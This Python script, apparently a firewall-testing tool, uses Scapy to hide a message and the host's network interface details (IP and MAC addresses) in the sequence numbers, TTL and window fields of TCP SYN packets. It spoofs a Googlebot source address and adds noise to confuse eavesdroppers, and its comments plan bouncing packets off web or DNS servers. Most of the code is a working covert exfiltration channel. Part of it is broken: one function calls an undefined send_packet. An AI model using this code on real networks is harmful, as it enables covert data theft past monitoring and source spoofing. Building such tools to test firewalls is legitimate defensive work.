#!/usr/bin/env python

'''
=======================================================================
  ___  _                  _    _ _             ___                _
 |   \(_)______ ___ _ __ | |__| (_)_ _  __ _  | __|__ _ _ _ _ ___| |_
 | |) | (_-<_-</ -_) '  \| '_ \ | | ' \/ _` | | _/ -_) '_| '_/ -_)  _|
 |___/|_/__/__/\___|_|_|_|_.__/_|_|_||_\__, | |_|\___|_| |_| \___|\__|
                                       |___/

=======================================================================

Send a message using TCP sequence numbers, ttl, window size, and perhaps
others. Inject noise into the channel to confuse eavesdroppers.

Sequence numbers have a generous size limit of 32bits.

The sequence numbers are converted to ASCII by dividing by 16777216 which is a
representation of 65536*256. [1] see README

TODO:
- add try, except where appropriate
- add mode [demo, live]
  demo mode will send packets immediately
  live mode will send 1 packet per second 3 times, once a minute (adjustable)
- add bounce functionality
  e.g. bounce SYN packet off an active web server
- Add dummy packet data to mimic real traffic. (should we bother?)
- Add TODOs to the issue queue on github.

Questions:
- Why not bounce off DNS server(s) ?
- Should we cipher the seq numbers we generate in order to add a layer of
  obfuscation? So if the traffic is detected it won't be easily translated.

Notes:
A testing suite should be able to perform all tests or individual tests.
Lets start out by building the initial tests we are interested in and then run
through them all. I'll add this info to the issue queue. - Clay

'''

# =======
# Imports
# =======

from scapy.all import *
import os
import sys
import random
import netifaces


# ================
# Global variables
# ================

# Set the mode
mode = 'demo'
# mode = 'live'

thishost = os.uname()[1]
multiplier = 16777216        # the server will be performing the division
message = 'hello from ' + thishost
seq_array = []  # clear before each use

destination = '127.0.0.1'
# When using a bounce host, the bounce host will be the destination
# and the source host will be our server.
bounce = ''
# Spoof our source
spoof = '66.249.66.1'  # Spoof crawl-66-249-66-1.googlebot.com
# Get our real ip. This is especially useful in NAT'd environments.
interfaces = netifaces.interfaces()

# =========
# Functions
# =========


# TODO:
# Add functions to perform the various techniques to test a firewall against.

def exfil_ipid():
	print '[*] Attempting ID identification exfil..'


def exfil_bounce():
	print '[*] Attempting Ack sequence number bounce exfil..'


# Convert message
# Lots of options here but we're going to convert each letter of the message
# to its decimal equivalent.. which will be multiplied by the multiplier.
def convert_message():
	print '[*] converting message: %s' % message
	for char in message:
		c = ord(char)
		# While we are here, might as well generate our SYN packet sequence
		# number.
		seq = c * multiplier
		# Add seq to the global seq_array.
		seq_array.append(seq)
		print '%s=%d, seq=%d' % (char, c, seq)

def add_n0ise(i):
	print '[*] adding n0ise..'
	y = seq_array[i]
	# Add some randomness for schlitz n giggles
	randy = random.randint(-99999999, 99999999)
	pkt.seq = y + randy
	# Signal noisy packet
	pkt.window = int(8182) - random.randint(23, 275)
	pkt.ttl = 128
	send(pkt)

# Send message using initial sequence numbers. Add noise.
def exfil_iseq():
	i = 0
	k = 8192  # window size
	for s in seq_array:
		add_n0ise(i)
		pkt.window = k
		pkt.ttl = 64
		pkt.seq = seq_array[i]
		send(pkt)
		i += 1

# This function sends interface details for interfaces of interest, AF_INET
# family.
def send_iface():
	print '[*] interfaces: %s' % interfaces
	# Interesting in sending found en*, eth*, and wlp* interface data
	for face in interfaces:
		addrs = netifaces.ifaddresses(face)
		# Get the MAC address
		facemac = addrs[netifaces.AF_LINK]
		try:
			print face, netifaces.ifaddresses(face)[2], facemac
			# Try to display en*
			if 'en' in face or 'eth' in face or 'wlp' in face:
				print '[*] found: %s' % face
				message = str(netifaces.ifaddresses(face)[2])
				convert_message()
				send_packet()
		except:
			# skip, do nothing
			print "[-] interface does not contain AF_INET family."


# ============
# Main program
# ============

# Convert our original message. Later we'll update our message and send
# network interface data.
convert_message()

# How long is our message. We can use this when adding noise. If we use the
# ttl then this will be easy to crack. We might be able to create an algorithm
# that's complex enough to at least frustrate our adversaries.
msglen = len(seq_array)

# Craft our basic packet.
# Future work: adjust some fields to perhaps better emulate commonly seen traffic.
pkt = IP(src=spoof, dst=destination)/TCP(dport=37337, flags='S')

# Attempt data exfiltration using initial sequence numbers
exfil_iseq()

seq_array = []  # clear before each use

print '[*] sent: %s' % message
print '[*] Getting ready to send network interface details'

send_iface()

